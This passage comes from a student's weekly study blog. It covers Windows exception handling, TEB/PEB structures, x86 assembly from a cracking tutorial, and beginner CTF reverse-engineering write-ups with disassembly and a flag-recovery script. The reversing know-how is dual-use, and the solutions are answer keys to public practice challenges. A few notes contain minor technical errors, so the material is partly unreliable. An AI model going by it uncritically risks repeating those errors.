<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用peid插件krypto analyzer分析，得知程序含有md5的迭代常数，可以猜测使用了md5算法<br>输入的注册码后进行长度等的判断以及数据初步处理：<br><img src="https://s1.ax1x.com/2020/04/12/GLmt7n.png" alt=""><br>上图call的地址里的代码，通过mov的4个数判断在进行md5初始化：<br><img src="https://s1.ax1x.com/2020/04/12/GLmY0s.png" alt="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法" title="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法">   </p>
<h3 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h3><p>只看了一点，就放到下周的周报上了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.11-2020.05.17</title>
    <url>/32652.html</url>
    <content><![CDATA[<h1 id="Windows下的异常处理"><a href="#Windows下的异常处理" class="headerlink" title="Windows下的异常处理"></a>Windows下的异常处理</h1><p>操作系统处理程序错误或异常的一系列流程和技术的总称。主要有两种异常处理技术，SEH（结构化异常处理）和VEH（向量化异常处理）   </p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>中断是由外部硬件设备或异步事件产生的，异常是由内部事件产生的，可分为故障、陷阱、终止 3类。前两个是可恢复的，第三个是不可恢复的，系统必须重启   </p>
<h3 id="异常列表"><a href="#异常列表" class="headerlink" title="异常列表"></a>异常列表</h3><p><img src="https://s1.ax1x.com/2020/05/18/YfskvR.png" alt="YfskvR.png"><br>由cpu引发的称为硬件异常，如访问一个无效的地址；由操作系统或程序引发的称为软件异常<br>代码中可以用RaiseException()主动引发一个软件异常<br><a id="more"></a>  </p>
<h3 id="异常处理的基本过程"><a href="#异常处理的基本过程" class="headerlink" title="异常处理的基本过程"></a>异常处理的基本过程</h3><p>中断或异常发生时，cpu会通过中断描述符表（IDT）寻找处理函数。IDT是硬件和软件交接中断和异常的关口   </p>
<h4 id="IDT"><a href="#IDT" class="headerlink" title="IDT"></a>IDT</h4><p>IDT是一张位于物理内存中的线性表，共有256项，32位下每个项的长度是8字节，64位下每个项的长度是64字节。<br>IDT的位置和长度是由cpu的IDTR寄存器描述的，IDTR共有84位，高32位为基址，低16位是表度长度。可以使用SIDT和LIDT指令读写该寄存器，LIDT只能在ring0下运行<br>IDT的每一项都是一个门结构，包括：  </p>
<ol>
<li>任务门描述符，用于cpu的任务切换</li>
<li>中断门，用于描述中断处理程序的入口</li>
<li>陷阱门，用于描述异常处理程序的入口  </li>
</ol>
<p>用windbg的本地内核调试模式可以观察IDT<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lkd&gt; !idt &#x2F;a</span><br></pre></td></tr></table></figure></p>
<h4 id="异常处理的准备工作"><a href="#异常处理的准备工作" class="headerlink" title="异常处理的准备工作"></a>异常处理的准备工作</h4><p><img src="https://s1.ax1x.com/2020/05/18/YfsVDx.png" alt="YfsVDx.png"><br>当由异常或者中断发生时，cpu会根据中断类型号执行对应的中断处理程序。<br>各个异常处理函数除了针对本异常的特定处理之外，通常会将异常信息进行封装。<br>封装的内容中，一部分是异常记录，包含本次异常的信息，包括异常代码（异常产生的原因）、异常标志、异常发生的地址等；另一部分是陷阱帧，它精确的描述了发生异常时的线程状态，该结构与处理器有关，在不同平台上结构不同。<br>封装后，异常处理函数会调用nt!KiDispatchException函数处理异常，</p>
<h4 id="内核态的异常处理过程"><a href="#内核态的异常处理过程" class="headerlink" title="内核态的异常处理过程"></a>内核态的异常处理过程</h4><p>即当PreviousMode为KernelMode时。此时KiDispatchException会进行以下分发异常    </p>
<ol>
<li>检测系统是否正在被内核调试器调试。如果内核调试器存在，系统就把异常处理的控制权转交给内核调试器。内核调试器取得控制权后会根据用户对异常处理的设置来确定是否要处理异常。如果处理了，那么异常的线程就会回到原来的位置继续执行；如果无法确定是否处理，就发生中断，由用户决定处理   </li>
<li>如果不存在内核调试器，或者1中不处理该异常，系统将调用nt!RtlDispatchException,根据线程注册的结构化异常处理过程来处理   </li>
<li>如果2时没有处理异常，系统会让内核调试器再次取得对异常的处理权   </li>
<li>如果不存在内核调试器或3中调试器仍不处理，系统就认为不能继续运行了，会直接KeBugCheckEX,产生蓝屏错误<br>在上述异常处理过程中，只有在某一步中异常没有处理才会进行下一个过程，只要异常被处理了，就会终止整个异常处理过程</li>
</ol>
<h4 id="用户态异常处理过程"><a href="#用户态异常处理过程" class="headerlink" title="用户态异常处理过程"></a>用户态异常处理过程</h4><p>即当PreviousMode为UserMode时。此时KiDispatchException依然会检测内核调试器是否存在，如果存在就会优先把控制权交给内核调试器。多数情况下，内核调试器不处理用户态的异常，nt!KiDispatchException就会进行如下过程：</p>
<ol>
<li>如果发生异常的程序正在被调试，那么将异常信息发送给正在调试的用户态调试器；如果没有被调试就跳过这个步骤</li>
<li>如果没有被调试或调试器未处理异常，那么在栈上放置EXCEPTION_RECORD和CONTEXT两个结构，并将控制权返回用户态ntdll.dll中的KiUserExceptionDispatche函数，由它调用其它函数进行用户态的异常处理，这一部分涉及SEH和VEH两种处理机制。如果没有调试器能附加或调试器处理不了异常，系统就调用ExitProcess函数结束程序</li>
<li>如果2未能处理该异常，那么会再次回到nt!KiDispatchException,再次把异常信息发送给用户态的调试器，如果没有调试器则直接结束进程</li>
<li>如果3中调试器仍不处理，则nt!KiDispatchException再次把异常分发给进程的异常端口进行处理。该端口通常由子系统进程csrss.exe进行监听。子系统监听后会显示一个“应用程序错误”对话框。可以单击按钮，将其附加到调试器。如果没有调试器或者处理不了，则程序被终结</li>
<li>在终结程序之前，系统会再次调用发生异常的线程中的所有异常处理过程，这是线程异常处理过程中清理未释放资源的机会</li>
</ol>
<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p>按照<a href="http://c.biancheng.net/cplus/" target="_blank" rel="noopener">http://c.biancheng.net/cplus/</a> 的顺序</p>
<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>在之前的周报中有记过<a href="https://brubbish.github.io/20849.html#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%88OOP%EF%BC%89%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%90%8D%E8%AF%8D">2020.03.30-2020.04.05</a>，现在忘了一些，再看一看，加深印象。<br>&emsp;<br>类可以看作 c 语言中结构体的升级版。<br>类的成员不但可以是变量，还可以是函数,通过类定义出的变量叫做对象<br>（也将类的成员变量称为属性，类的成员函数称为方法）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s的年龄是 %d，成绩是 %f\n"</span>, name, age, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line">stu1.name = <span class="string">"小明"</span>;</span><br><span class="line">stu1.age = <span class="number">15</span>;</span><br><span class="line">stu1.score = <span class="number">92.5f</span>;</span><br><span class="line">stu1.say();</span><br></pre></td></tr></table></figure>
<p>先用<strong>关键字</strong>class定义了一个<strong>类</strong>student，用这个类创建了一个<strong>对象</strong>stu1，后面这个过程叫做<strong>类的实例化</strong>，所以也称对象是类的一个<strong>实例</strong></p>
<p>在面向对象编程中，类由一组相关联的函数和变量组成，可以将一个或多个类放在一个源文件中，在使用时引入对应的类，调用需要的函数。</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.27-2020.05.03</title>
    <url>/59200.html</url>
    <content><![CDATA[<h1 id="Windows内核基础"><a href="#Windows内核基础" class="headerlink" title="Windows内核基础"></a>Windows内核基础</h1><h2 id="内核的数据结构"><a href="#内核的数据结构" class="headerlink" title="内核的数据结构"></a>内核的数据结构</h2><h3 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h3><p>TEB结构(Thread environment block,线程环境块)和PEB一样，是应用层中的结构。<br>包含了系统频繁使用的一些与线程相关的数据，进程中每个线程（除系统线程）都有一个自己的TEB，一个进程的所有TEB都存放在从0x7FFDE000开始的线性内存中，每4KB为一个完整的TEB<br>用WinDbg的本地调试功能可以查看系统中的TEB结构<br><a id="more"></a></p>
<h4 id="TEB访问"><a href="#TEB访问" class="headerlink" title="TEB访问"></a>TEB访问</h4><p>可以通过NtCurrentTab函数调用和FS段寄存器访问两种方式访问TEB结构  </p>
<ol>
<li>NtCurrentTab<br>一个ntdll.dll中的函数，该函数可以返回当前线程TEB的地址  </li>
<li>FS段寄存器<br>当代码运行在r3时，fs指向的段的基地址即为当前线程的TEB</li>
</ol>
<h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>PEB(Process Environment Block,进程环境块)存在于用户地址空间中，每个进程都有自己的PEB信息<br>PEB结构的地址放在TEB中，因此可以通过fs：[偏移量]访问PEB的地址</p>
<h1 id="使用OD从零开始Cracking"><a href="#使用OD从零开始Cracking" class="headerlink" title="使用OD从零开始Cracking"></a>使用OD从零开始Cracking</h1><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><ol>
<li>nop   </li>
<li>堆栈相关指令   <ol>
<li>push<br>push[内存地址]<br>push[eax]<br>push 数值</li>
</ol>
<ul>
<li>ptr：防止两个操作数不一样。<br>用byte/word/dword ptr指定内存单元的长度（字节、字、双字）  </li>
</ul>
<ol>
<li>pop   </li>
<li>pushad<br>按照eax、ecx、edx、ebx、esp、ebp、esi、edi的顺序把所有通用寄存器压入栈   </li>
<li>popad<br>把pushad入栈的值取出（顺序相反）   </li>
<li>16位程序中有pusha、popa</li>
</ol>
</li>
<li>赋值指令   <ol>
<li>mov   </li>
<li>movsx(操作有符号数)<br>第一个操作数的位数比第二个操作数多，第二个填充第一个的前面几位<br>填充的结果跟填充数字正负有关。用负数填充，结果的剩余部分填F；整数填充剩余部分填0。<br>如：用F000填EAX，结果为FFFFF000；用1234填EAX，结果为00001234.<br>(16位数的正数范围为0~7FFF，负数范围为8000~FFFF)</li>
<li>movzx（操作无符号数）<br>与movsx相似，但剩余部分总填充0</li>
<li>LEA<br>取地址指令，第一个操作数是通用寄存器，第二个是内存单元的地址（而不是值）<br>如”LEA EAX,DOWRD PTR DS:[ECX+38]”不是获取内存中[ECX+38],而要计算ECX+38的值，并赋给EAX   </li>
<li>XCHG<br>交换两个操作数的值，寄存器/内存单元和寄存器  <h2 id="数学指令"><a href="#数学指令" class="headerlink" title="数学指令"></a>数学指令</h2></li>
</ol>
</li>
<li>inc dec</li>
<li>add sub</li>
<li>adc (带进位的加法)<br>将两个操作数和进位标志（CF）的值相加放到第一个操作数中</li>
<li>SBB<br>计算（第一个操作数-第二个操作数）再减去进位标志，将结果 存到第一个操作数中</li>
<li>MUL<br>无符号数乘法。只有一个操作数，操作数和EAX相乘，结果放到EDX:EAX中</li>
<li>IMUL<br>用于有符号数的乘法<br>一个操作数时类似于MUL。<br>当有两个操作数时，两者相乘，结果放到第一个操作数中<br>当有三个操作数时，如，”IMUL EBP,DWORD PTR [ESI+74], FF800002”,意思是EBP=[ESI+74]*FF800002   </li>
<li>DIV(无符号)/IDIV(有符号)<br>DIV只有一个操作数，结果存放到EDX:EAX中<br>IDIV：<br>一个操作数时，于DIV相似<br>两个操作数时，第一个除以第二个，结果存放到第一个操作数中<br>三个操作数时，第二哥除以第一个，结果存放到第一个操作数中<br>（与IMUL类似）</li>
<li>XADD(交换并相加)<br>XCHG和ADD的组合，先将两个操作数交换数值，然后值相加赋给第一个操作数</li>
<li>NEG<br>取反</li>
</ol>
<h2 id="逻辑指令"><a href="#逻辑指令" class="headerlink" title="逻辑指令"></a>逻辑指令</h2><p>两个操作数，将两个操作数按位运算，并将结果存入第一个操作数中</p>
<ol>
<li>AND<br>两个二进制位都为1，结果为1，此外都为0</li>
<li>OR<br>有一位为1，结果就为1</li>
<li>XOR<br>不同取1，相同取0</li>
<li>NOT<br>取反（1-0，0-1）</li>
</ol>
<h1 id="两个攻防世界上的新手re题"><a href="#两个攻防世界上的新手re题" class="headerlink" title="两个攻防世界上的新手re题"></a>两个攻防世界上的新手re题</h1><p>其实没看出来哪跟re有关了  </p>
<h2 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1</a>   </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag就是解出的hash值，没啥难度。（就是为了凑行数）</p>
<h2 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1</a></p>
<p>就用16进制编辑器打开然后搜索“flag”</p>
<h1 id="写了个爬自己网易云红心歌单的爬虫"><a href="#写了个爬自己网易云红心歌单的爬虫" class="headerlink" title="写了个爬自己网易云红心歌单的爬虫"></a>写了个爬自己网易云红心歌单的爬虫</h1><p><a href="https://brubbish.github.io/53778.html">一个爬取自己网易云歌单的爬虫</a>   </p>
<p>其实还没写完</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.04-2020.05.10</title>
    <url>/12483.html</url>
    <content><![CDATA[<h1 id="攻防世界新手题"><a href="#攻防世界新手题" class="headerlink" title="攻防世界新手题"></a>攻防世界新手题</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1</a></p>
<p>原来flag还能长”9447{This_is_a_flag}”这样….<br><a id="more"></a></p>
<h3 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400707 loc_400707:                             ; CODE XREF: main+177↓j</span><br><span class="line">.text:0000000000400707                 lea     rdi, [rbp+s]    ; s</span><br><span class="line">.text:000000000040070B                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:000000000040070F                 mov     [rbp+var_88], rax</span><br><span class="line">.text:0000000000400716                 call    _strlen</span><br><span class="line">.text:000000000040071B                 mov     rdi, [rbp+var_88]</span><br><span class="line">.text:0000000000400722                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400725                 jnb     loc_4007AC</span><br><span class="line">.text:000000000040072B                 lea     rdi, [rbp+var_20] ; s</span><br><span class="line">.text:000000000040072F                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400733                 mov     [rbp+var_90], rax</span><br><span class="line">.text:000000000040073A                 call    _strlen</span><br><span class="line">.text:000000000040073F                 mov     rdi, [rbp+var_90]</span><br><span class="line">.text:0000000000400746                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400749                 jb      loc_400754</span><br><span class="line">.text:000000000040074F                 call    sub_4007C0</span><br><span class="line">.text:0000000000400754 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400754</span><br><span class="line">.text:0000000000400754 loc_400754:                             ; CODE XREF: main+119↑j</span><br><span class="line">.text:0000000000400754                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400758                 mov     cl, [rbp+rax+var_20]</span><br><span class="line">.text:000000000040075C                 mov     [rbp+var_55], cl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:0000000000400762                 cdq</span><br><span class="line">.text:0000000000400763                 idiv    [rbp+var_2C]</span><br><span class="line">.text:0000000000400766                 movsxd  rsi, edx</span><br><span class="line">.text:0000000000400769                 mov     cl, byte ptr [rbp+rsi+var_28]</span><br><span class="line">.text:000000000040076D                 mov     [rbp+var_56], cl</span><br><span class="line">.text:0000000000400770                 movsx   edx, [rbp+var_55]</span><br><span class="line">.text:0000000000400774                 movsx   edi, [rbp+var_56]</span><br><span class="line">.text:0000000000400778                 xor     edx, edi</span><br><span class="line">.text:000000000040077A                 mov     cl, dl</span><br><span class="line">.text:000000000040077C                 mov     [rbp+var_57], cl</span><br><span class="line">.text:000000000040077F                 movsxd  rsi, [rbp+var_54]</span><br><span class="line">.text:0000000000400783                 movsx   edx, [rbp+rsi+s]</span><br><span class="line">.text:0000000000400788                 movsx   edi, [rbp+var_57]</span><br><span class="line">.text:000000000040078C                 cmp     edx, edi</span><br><span class="line">.text:000000000040078E                 jz      loc_400799</span><br><span class="line">.text:0000000000400794                 call    sub_4007C0</span><br><span class="line">.text:0000000000400799 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400799</span><br><span class="line">.text:0000000000400799 loc_400799:                             ; CODE XREF: main+15E↑j</span><br><span class="line">.text:0000000000400799                 jmp     $+5</span><br><span class="line">.text:000000000040079E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040079E</span><br><span class="line">.text:000000000040079E loc_40079E:                             ; CODE XREF: main:loc_400799↑j</span><br><span class="line">.text:000000000040079E                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:00000000004007A1                 add     eax, 1</span><br><span class="line">.text:00000000004007A4                 mov     [rbp+var_54], eax</span><br><span class="line">.text:00000000004007A7                 jmp     loc_400707</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:<br>CQD:<br>把edx的所有位设成eax最高位的值</p>
</blockquote>
<p>在最后的“jmp     loc_400707”实现循环<br>跳转到sub_4007C0后，就显示输入的密码错误   </p>
<p>由于不会分析了 就 看了伪代码<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">":\"AL_RT^L*.?+6/46"</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560L</span>L;</span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"To continue, you must enter the correct password.\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your guess: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    sub_4007C0(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4007F0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其中v7可以转换为16进制再转换成字符串，所以v7在运算时变为”haramb”<br>得到flag的代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> k1[]=<span class="string">":\"AL_RT^L*.?+6/46"</span>;</span><br><span class="line">	<span class="keyword">char</span> k2[]=<span class="string">"harambe"</span>;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">7</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(k1);i++)&#123;</span><br><span class="line">		s[i]=(<span class="keyword">char</span>)(*(k2+i%a)^k1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="彦林学长给的一题"><a href="#彦林学长给的一题" class="headerlink" title="彦林学长给的一题"></a>彦林学长给的一题</h3><p>题在这边：<a href="https://zhangsi.lanzous.com/icfzx7c" target="_blank" rel="noopener">easyYM</a><br>看了他的wp<br>嗯…感觉自己知道 有flag的那块地方没有被调用，但一方面是不知道是哪些函数跟flag有关（通过查看字符串）(后来用ida打开发现，放在main函数里，刚开始就跳过了） ，另外就是没有想到od设置某处为新eip的功能</p>
<h1 id="装Pwntools"><a href="#装Pwntools" class="headerlink" title="装Pwntools"></a>装Pwntools</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install pwntools -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h2><ul>
<li>广义表<br>广义表中的元素可以是一个单元素，也可以是另一个表。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Glist</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    Element Type Data;  <span class="comment">//用这个标志控制结点为单元素或者广义表</span></span><br><span class="line">    Glist anlist;</span><br><span class="line">  &#125;</span><br><span class="line">  Glist Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
广义表即为一个多重链表<br>多重链表中结点的指针域有多个（如anlist和Next）,包含两个指针域的链表不一定是多重链表(如双向链表)   </li>
</ul>
<h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>数据对象集：有穷线性表<br>操作集：堆栈的长度、堆栈元素   </p>
<ol>
<li>生成长度为MaxSize的空堆栈</li>
<li>判断堆栈是否满了</li>
<li>将一个元素压入堆栈</li>
<li>判断堆栈是否为空</li>
<li>删除并返回栈顶元素<br>栈的顺序存储结构由一个<strong>一位数组</strong>和一个<strong>记录栈顶位置</strong>的变量top组成  </li>
</ol>
<h3 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h3><h4 id="入栈"><a href="#入栈" class="headerlink" title="入栈"></a>入栈</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top==MaxSize<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"堆栈满"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  s-&gt;data[s-&gt;top]=item;</span><br><span class="line">  (s-&gt;top)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top=<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"堆栈空"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  data=s-&gt;data[(s-&gt;top)--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h3><p>用一个单链表，称作链栈<br>top在链表的头结点，头结点里不存放其他元素   </p>
<h4 id="入栈-1"><a href="#入栈-1" class="headerlink" title="入栈"></a>入栈</h4><p><img src="https://s1.ax1x.com/2020/05/08/Ynrdv6.png" alt="Ynrdv6.png"></p>
<h4 id="出栈-1"><a href="#出栈-1" class="headerlink" title="出栈"></a>出栈</h4><p>记得free()<br><img src="https://s1.ax1x.com/2020/05/08/Ynr0KK.png" alt="Ynr0KK.png"></p>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>只能在一端插入（入队），在另一端删除（出队）<br>先进先出   </p>
<h3 id="顺序存储-1"><a href="#顺序存储-1" class="headerlink" title="顺序存储"></a>顺序存储</h3><p>一个一维数组+一个记录头元素的变量front+一个记录尾元素的变量rear<br>front指向第一个元素的前一个位置</p>
<ul>
<li>循环队列<br>当front和rear相等时为空（或相等）（解决方案：加入一个额外标记；使用n-1个空间）     </li>
</ul>
<p><img src="https://s1.ax1x.com/2020/05/08/YnrBDO.png" alt="YnrBDO.png"></p>
<h3 id="链式存储-1"><a href="#链式存储-1" class="headerlink" title="链式存储"></a>链式存储</h3><p>存在单链表中，front和rear指针分别指向头和尾</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>数据结构</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.25-2020.05.24</title>
    <url>/33336.html</url>
